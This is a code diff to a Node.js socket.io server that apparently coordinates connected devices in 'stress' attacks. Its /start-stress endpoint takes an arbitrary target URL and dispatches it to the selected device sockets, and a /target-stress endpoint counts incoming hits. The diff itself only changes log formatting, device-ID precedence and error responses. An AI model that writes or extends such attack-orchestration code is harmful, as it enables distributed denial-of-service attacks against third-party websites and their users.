@@ -76,7 +76,7 @@ io.on("connection", (socket) => {
         }
 
         currentName = data.name;
-        currentDeviceID = data.device_id || data.name; 
+        currentDeviceID = data.name || data.device_id; 
 
         if (connectedDevices.has(currentDeviceID)) {
             const oldSocketId = connectedDevices.get(currentDeviceID);
@@ -93,7 +93,7 @@ io.on("connection", (socket) => {
 
         io.emit("online_count", connectedDevices.size);
 
-        console.log(`${RESET} [ ${GREEN}Socket${RESET} ] ID: ${socket.id} | IP: ${socket.clientIp} | Device: ${CYAN}${currentName}${RESET} | Online : ${connectedDevices.size}`);
+        console.log(`${RESET} [ ${GREEN}>${RESET} ] ${socket.id} ${GREEN}|${RESET} ${socket.clientIp} ${GREEN}|${RESET} ${currentName} ${GREEN}|${RESET} ${connectedDevices.size}`);
 
         check_user(data, socket.id).catch(err => console.error(err));
     });
@@ -103,7 +103,7 @@ io.on("connection", (socket) => {
             connectedDevices.delete(currentDeviceID);
             io.emit("online_count", connectedDevices.size);
             
-            console.log(`${RESET} [ ${RED}Socket${RESET} ] ID: ${socket.id} | Device: ${CYAN}${currentName || "Unknown"}${RESET} | Online : ${connectedDevices.size}`);
+            console.log(`${RESET} [ ${RED}<${RESET} ] ${socket.id} ${RED}|${RESET} ${socket.clientIp} ${RED}|${RESET} ${currentName || "Unknown"} ${RED}|${RESET} ${connectedDevices.size}`);
         }
     });
 });
@@ -148,11 +148,12 @@ app.post("/start-stress", (req, res) => {
     console.log(`${RESET} [ ${RED}Stress${RESET} ] Attack started`);
     let { url, devices, method } = req.body;
     
-    if (!url) return res.status(400).json({ error: "URL required" });
+    if (!url) return res.status(400).end();
 
     let targetIds = getUniqueTargetSockets(devices);
 
-    if (targetIds.length === 0) return res.status(503).json({ error: "No unique devices found" });
+    if (targetIds.length === 0)
+        return res.status(404).end();
 
     targetIds.forEach(socketId => {
         const socket = io.sockets.sockets.get(socketId);
@@ -191,7 +192,7 @@ app.all("/target-stress", (req, res) => {
     const s = now.getSeconds().toString().padStart(2, '0');
     const time = `${h}:${m}:${s}`;
 
-    console.log(`${RESET} [ ${RED}Attack${RESET} ] IP: ${CYAN}${attackerIp}${RESET} | ${time} | Hits: ${stressCounter}`);
+    console.log(`${RESET} [ ${RED}Attack${RESET} ] ${attackerIp} ${RED}|${RESET} ${time} ${RED}|${RESET} Hits: ${stressCounter}`);
     
     res.status(200).end();
 });
